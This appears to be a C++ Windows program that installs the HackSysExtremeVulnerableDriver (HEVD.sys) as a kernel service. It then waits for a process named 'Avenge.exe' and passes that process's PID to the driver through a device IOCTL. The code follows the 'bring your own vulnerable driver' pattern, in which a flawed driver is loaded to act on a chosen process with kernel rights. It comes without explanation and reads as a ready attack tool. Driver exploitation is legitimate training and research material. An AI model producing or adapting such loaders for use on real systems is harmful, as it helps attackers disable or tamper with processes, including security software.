#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

#define DEVICE_NAME     L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL           0x222003

// Function to load the driver
BOOL LoadDriver(LPCWSTR driverPath, LPCWSTR driverName) {
    SC_HANDLE serviceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!serviceControlManager) {
        std::cout << "Failed to open the Service Control Manager. Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    SC_HANDLE service = CreateService(serviceControlManager,
        driverName,
        driverName,
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    if (!service) {
        service = OpenService(serviceControlManager, driverName, SERVICE_START | DELETE | SERVICE_STOP);
        if (!service) {
            std::cout << "Failed to open or create the service. Error: " << GetLastError() << std::endl;
            CloseServiceHandle(serviceControlManager);
            return FALSE;
        }
    }

    SERVICE_STATUS serviceStatus;
    ZeroMemory(&serviceStatus, sizeof(serviceStatus));

    if (!StartService(service, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        std::cout << "Failed to start the service. Error: " << GetLastError() << std::endl;
        CloseServiceHandle(service);
        CloseServiceHandle(serviceControlManager);
        return FALSE;
    }

    CloseServiceHandle(service);
    CloseServiceHandle(serviceControlManager);
    return TRUE;
}

int main() {
    LPCWSTR driverPath = L"C:\\Users\\xakep\\Downloads\\HEVD.sys"; // Change this to the path where you have the driver file
    LPCWSTR driverName = L"HackSysExtremeVulnerableDriver";

    if (!LoadDriver(driverPath, driverName)) {
        std::cout << "Failed to load the driver." << std::endl;
        return 1;
    }

    HANDLE deviceHandle = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create a handle to the device. Error: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD pid = 0;
    while (true) {
        HANDLE processHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (processHandle == INVALID_HANDLE_VALUE) {
            std::cout << "Failed to create a snapshot of the processes. Error: " << GetLastError() << std::endl;
            CloseHandle(deviceHandle);
            return 1;
        }

        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(processEntry);

        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(processHandle, &processEntry)) {
            std::cout << "Failed to get the first process in the snapshot. Error: " << GetLastError() << std::endl;
            CloseHandle(processHandle);
            CloseHandle(deviceHandle);
            return 1;
        }

        bool processFound = false;
        do {
            if (wcscmp(processEntry.szExeFile, L"Avenge.exe") == 0) {
                processFound = true;
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(processHandle, &processEntry));

        CloseHandle(processHandle);
        if (processFound) {
            std::cout << "Found Avenge.exe with PID " << pid << "." << std::endl;
            DWORD bytesReturned;
            BOOL result = DeviceIoControl(deviceHandle, IOCTL, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);

            if (!result) {
                std::cout << "Failed to communicate with the driver. Error: " << GetLastError() << std::endl;
                CloseHandle(deviceHandle);
                return 1;
            }

            std::cout << "Sent IOCTL to the driver with PID " << pid << "." << std::endl;
            break;
        }
        else {
            std::cout << "Avenge.exe not found. Waiting..." << std::endl;
            Sleep(1000);
        }
    }

    CloseHandle(deviceHandle);
    return 0;
}